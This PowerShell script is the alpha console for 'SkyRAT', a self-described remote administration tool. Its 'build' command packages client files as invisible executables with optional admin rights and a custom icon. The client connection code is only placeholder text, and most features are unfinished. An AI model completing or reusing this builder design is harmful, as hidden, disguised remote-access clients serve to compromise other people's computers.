
############################################################################################################################################################################################

###    .x####.   .####x.                .#####* ##               #######     ###  ########
###   '     '*###*'     '               ##.     ##..##* ##.  .## ##*  *##   ## ##   '##'
###                    .x##.  .##x.      *####. ###*'    *#.##*' ##...###   ##.##    ##
###    .xx. .xx.      '   '*##*'   '       ..## ##*##    *##*'   ######.   ##*#*##   ##
###   '    '    '                      .#####** ## '##. .#*'     ##   ## ¤ ##   ## ¤ ## ¤

############################################################################################################################################################################################

#  A Powershell Remote Administration Tool
#  Built with love <3 by YSCHGroup using the Windows PowerShell Framework.
#  (Please note that we do not encurage you to do anyting illegal with this tool. )

############################################################################################################################################################################################

function load-banner {
    # This function get the content from the banner.txt file inside the data folder and displays it with the correct colors etc.
    # It replaces each color tag with an new write-host fuction with special properties, and then revokes the whole command line as an cmdlet.
    $banner = Get-Content "$global:SkyratHome\data\banners\1.txt" | out-string;
    $banner = $banner.Replace("<>", "write-host '';");
    $banner = $banner.Replace("<..>", """; ");
    $banner = $banner.Replace("<.>", """ -nonewline; ");
    $banner = $banner.Replace("<white>", "write-host -f White """);
    $banner = $banner.Replace("<cyan>", "write-host -f Cyan """);
    $banner = $banner.Replace("<red>", "write-host -f Red """);
    $banner = $banner.Replace("<blue>", "write-host -f Blue """);
    $banner = $banner.Replace("<darkgray>", "write-host -f DarkGray """);
    Invoke-Expression $banner
}


function display-splash {
    Write-Host "    Welcome $env:UserName to SkyRAT!
    An Remote Administrator Tool built with love using the Windows PowerShell Framework.
    (Please note that we do not encurage you to do anyting illegal with this tool.)
    //YSCHGroup

    " -f Yellow;
}


function display-clients {
    # This function will listen for all clients requesting an connection to the server (us) and list every one of them in a neat list for the server to pick from.
    Write-Host "    ┎───╼━┥ " -f gray -NoNewline; Write-Host "Online Clients" -f green -NoNewline; Write-Host " ┝━╾───┒" -f gray;
    Write-Host "    ╵                            ╵" -f Gray;
    $clientPath = "C:\Users\$env:UserName\AppData\LocalLow\clients.txt"
    if (Test-Path $clientPath) {
        $clients = Get-Content "C:\Users\$env:UserName\AppData\LocalLow\clients.txt"
        foreach ($client in $clients) {
            Write-Host "    › Test Item"
        }
    }else {
        Write-Host "              No Clients" -f Red
    }

    Write-Host "    ╷                            ╷" -f Gray;
    Write-Host "    ┖──────╼━━━━━━━━━━━━━━╾──────┚" -f gray;
}

function load-settings {
    if (Test-Path "$global:SkyratHome\data\config.dat") {
        # Set Default Settings
        $global:HostIp = "[Not Set]"
        
        # Load Settings
        $settings = Get-Content "$global:SkyratHome\data\config.dat"
        foreach ($setting in $settings) {
            $setting = $setting.ToLower().Split(" ")
            switch($setting[0]) {
                "hostip" {
                        $global:HostIp = $setting[2]
                    }
            }
        }

    }else {
        # Create Settings file
        "" > "$global:SkyratHome\data\config.dat"
    }
}



function skyrat-execute($cmd) {                         ###############################################  COMMANDS ###############################################
    if ($SkyRAT_input.ToLower() -eq "help") {                                        # Help
        Write-Host "
    Command                Description
    ¨¨¨¨¨¨¨                ¨¨¨¨¨¨¨¨¨¨¨
  ::Core Commands::
    help (issue/command)   Show the help menu etc                            [Under Construction]
    build                  Build a new client exe file                       [Under Construction]
    clients                List all online clients                           [Under Construction]
    connect                Connect to a client and start sending packages    [Under Construction]
    settings               Manage all settings                               [Under Construction]
    shell                  Open a shell on the local computer
    update                 Find the lates version of SkyRAT
    version                Display the current version number
    cls                    Clear screen
    menu                   Display the menu again
    restart                Restart SkyRAT
    exit                   Exit out from SkyRAT

  ::Other Commands::
    notes                  Show all saved notes
    note add [string]      Add a new note to notes
    note remove [line]     Remove a note from notes
    note clear             Clear all notes
    tips (tips number)     Show all available built in tips and trix!

  ::Shell Commands::
    skyrat/back/exit       Return to the SkyRAT interface

  _____________________________________________________________


  (If you see weird unicode characters above, change the console font to Consolas!
  For more help, see 'help font')


  If you'd like to run SkyRAT from a cmd/ps promp, just use the command 'skyrat'!

"
    }elseif ($SkyRAT_input.ToLower() -eq "help font") {                                 # Help font
        Write-Host "
    Help: Font    
    ¨¨¨¨¨¨¨¨¨¨
    If you see weird unicode characters in the main menu or when drawing the clients box,
    change the console font to some of these below:

        Consolas
        Hack
        Inconsolata
        MS Gothic
        MS Mincho

    Change a console font by right-click the titlebar, go into properties, and characters.
    There's a box which you can select different fonts.
"


    }elseif ($SkyRAT_input.ToLower() -eq "shell") {                                 # Shell
        skyrat-shell

    }elseif ($SkyRAT_input.ToLower() -eq "build") {                                 # Build
        Write-Host "Searching for IPaddresses..." -f DarkGray;
        (Get-NetIPConfiguration).IPv4Address
        Test-Connection $env:computername -count 1 | select Address,Ipv4Address | Out-String
        $HostIP = Read-Host "Host IP"
        $TcpPort = Read-Host "Port"

        Add-Type -AssemblyName System.Windows.Forms
            $dlg=New-Object System.Windows.Forms.SaveFileDialog
            $dlg.Filter = "EXE File (*.exe)|*.exe|BAT File (*.bat)|*.bat|PS1 File (*.ps1)|*.ps1|Text File (*.txt)|*.txt|All Files (*.*)|*.*"
            $dlg.SupportMultiDottedExtensions = $true;

        if($dlg.ShowDialog() -eq 'Ok'){
            # Generate file
            if ($dlg.FileName.EndsWith("exe")) {
                Write-Host "----- " -f darkGray -NoNewline;Write-Host "EXE" -f red -NoNewline;Write-Host " -----" -f darkGray;
                Write-Host "(space to dismiss settings below)" -f darkGray;
                $iconPath = Read-Host "Icon file path [path]"
                $admin = Read-Host "Run as admin? [y]"
                "
                [Client Code for ps1 here]
                Connect To: $HostIP :$TcpPort
                Start-Process 'www.google.se'
                ">"$global:SkyratHome\temp.ps1"
                start-sleep -s 2;
                if ($iconPath -and $admin) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -icon "$iconPath" -invisible -overwrite -admin; Remove-Item "$global:SkyratHome\temp.ps1"; }    # Call the ps1 to exe program with all different settings
                elseif ($iconPath) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -icon "$iconPath" -invisible; Remove-Item "$global:SkyratHome\temp.ps1"; }
                elseif ($admin) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -invisible -overwrite -admin; Remove-Item "$global:SkyratHome\temp.ps1"; }
                else {&"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -invisible; Remove-Item "$global:SkyratHome\temp.ps1"; }
            }elseif ($dlg.FileName.EndsWith("bat")) {
                Write-Host "----- " -f darkGray -NoNewline;Write-Host "BAT" -f red -NoNewline;Write-Host " -----" -f darkGray;
                "
                [Client Code for bat here]
                Connect To: $HostIP :$TcpPort
                ">$($dlg.filename)
            }elseif ($dlg.FileName.EndsWith("ps1")) {
                Write-Host "----- " -f darkGray -NoNewline;Write-Host "PS1" -f red -NoNewline;Write-Host " -----" -f darkGray;
                "
                [Client Code for ps1 here]
                Connect To: $HostIP :$TcpPort
                ">$($dlg.filename)
            }elseif ($dlg.FileName.EndsWith("txt")) {
                Write-Host "----- " -f darkGray -NoNewline;Write-Host "TXT" -f red -NoNewline;Write-Host " -----" -f darkGray;
                "
                [Client Code for txt here]
                Connect To: $HostIP :$TcpPort
                ">$($dlg.filename)
            }else {
                Write-Host "----- " -f darkGray -NoNewline;Write-Host "OTHER" -f red -NoNewline;Write-Host " -----" -f darkGray;
                "
                [Client Code for other here]
                Connect To: $HostIP :$TcpPort
                ">$($dlg.filename)
            }
            Write-host "[:)] Generating $($dlg.filename)..." -f Green;
        }else {
            Write-Host "[!] Save interrupted, interrupts client generation..." -f Red;
        }
    }elseif ($SkyRAT_input.ToLower() -eq "clients") {                               # clients
        display-clients

    }elseif ($SkyRAT_input.ToLower() -eq "version") {                               # version
        Write-Host "Current SkyRAT Version: $SkyratVersion" -f DarkYellow
    }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
        # Execute all code inside here

    }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
        # Execute all code inside here

    }elseif ($SkyRAT_input.ToLower().StartsWith("tips") -eq $true) {                # tips
         $tip = $SkyRAT_input.Split(" ")
         if (($tip[1] -eq "") -or ($SkyRAT_input.ToLower() -eq "tips")) {
         Write-Host "
    Command                Description
    ¨¨¨¨¨¨¨                ¨¨¨¨¨¨¨¨¨¨¨
1.  Custom Colors!!!       Change the default color of the prompt interface!
        "}elseif ($tip -eq "1") {                                                  # All SkyRAT Tips!
            Write-Host "
    Custom Colors!!!
    ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
/// Change the default color of the prompt interface! ///
    1. shell
    2. cmd
    3. color (color of choice, /h for list)
    4. exit
    5. exit
    ";
        }else {
            Write-Host "[ERROR] That tips does not exits..." -f Red;
        }


    }elseif ($SkyRAT_input.ToLower() -eq "menu") {                                  # menu
        cls
        main
    }elseif ($SkyRAT_input.ToLower() -eq "cls") {                                   # cls
        cls
        skyrat-input

    }elseif ($SkyRAT_input.ToLower() -eq "notes") {                                 # notes
        if (Test-Path "C:\Users\$env:UserName\AppData\LocalLow\notes.txt") {
            $linenr = 1
            Write-Host "Notes
¨¨¨¨¨"
            foreach($line in Get-Content "C:\Users\$env:UserName\AppData\LocalLow\notes.txt") {
                if($line -match $regex){
                    Write-Host "$linenr. $line"
                    $linenr ++;
                }
            }
        }else {
            Write-Host "You have currently no notes saved..."
        }
    }elseif ($SkyRAT_input.ToLower().StartsWith("note ") -eq $true) {                # note
        $option = $SkyRAT_input.Split(" ")
        switch($option[1]) {
            "add" {
                $option[0]
                $option[1]
                $noteAdd = $option -join " "
                Add-Content -Value $noteAdd -Path "C:\Users\$env:UserName\AppData\LocalLow\notes.txt"
                break;
            }
            "remove" {
                noteREM($option[2]);
                break;
            }
            "rem" {
                noteREM($option[2]);
                break;
            }
            "clear" {
                Remove-Item "C:\Users\$env:UserName\AppData\LocalLow\notes.txt"
                break;
            }
        }
    }elseif ($SkyRAT_input.ToLower() -eq "settings") {                                      # settings
        load-settings
        Write-Host "
    Setting                Set Value
    ¨¨¨¨¨¨¨                ¨¨¨¨¨¨¨¨¨
    host ip                $global:HostIp

"
        
    }elseif ($SkyRAT_input.ToLower() -eq "restart") {                                      # restart
        cls
        .\$global:SkyratHome\data\main.ps1
    }elseif ($SkyRAT_input.ToLower() -eq "exit") {                                      # exit
        exit;

    }elseif ($SkyRAT_input.ToLower() -eq "update") {                                      # exit
        Write-Host "The latest version of SkyRat can be found here: https://github.com/YSCHGroup/SkyRAT" -f Green;
        Write-Host "[Opens github repository...]" -f DarkGray;
        Start-Process "https://github.com/YSCHGroup/SkyRAT"
    }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
        # Execute all code inside here

    }else {                                                                         # error message
        Write-Host "[ERROR] That command does not exists! Use 'help' to show all commands..." -f Red;
    }
}
function noteREM($remLine) {
    $content = Get-Content "C:\Users\$env:UserName\AppData\LocalLow\notes.txt"
    $content | Foreach {$n=1}{if ($n++ -ne $remLine) {$_}} > "C:\Users\$env:UserName\AppData\LocalLow\notes.txt"
}
                                                           ##########################################################################################################





# SkyRAT
function skyrat-input {
    Write-Host "SkyRAT " -f Cyan -NoNewline;Write-Host "$PWD> " -NoNewline;
    $SkyRAT_input = Read-Host;
    if (-NOT($SkyRAT_input -eq "")) {
        skyrat-execute($SkyRAT_input)
    }
    skyrat-input
}

function skyrat-shell {
    Write-Host "SkyRAT:Shell " -f Cyan -NoNewline;Write-Host "$PWD> " -NoNewline;
    $SkyRAT_input = Read-Host;
    if (-NOT($SkyRAT_input -eq "")) {
        if ($SkyRAT_input.ToLower() -eq "back") {
            skyrat-input
        }elseif ($SkyRAT_input.ToLower() -eq "skyrat") {
            skyrat-input
        }elseif ($SkyRAT_input.ToLower() -eq "exit") {
            skyrat-input
        }else {
            Invoke-Expression $SkyRAT_input
        }
    }
    skyrat-shell
}


############################################################################################################################################################################################

############################################################################################################################################################################################

# Console settings
[Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$SkyratVersion = "v1.0.0 (Alpha)"

# Get Home Folder to execute programs etc from
if (Test-Path C:\tmp\skyhome.txt) {
    $global:SkyratHome = Get-Content C:\tmp\skyhome.txt
}else {
    cls
    Write-Host "Error! Please install SkyRAT before launching it!" -f Red;
    Start-Sleep -s 2;
    Write-Host "Press any key to continue ..."

    $x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}



# Main loop
function main {
    load-banner
    display-splash
    load-settings
    display-clients
    Write-Host "`n    Type 'help' for more information...`n" -f darkGray;
    skyrat-input
}

while($true){
    cls
    main;
}
Read-Host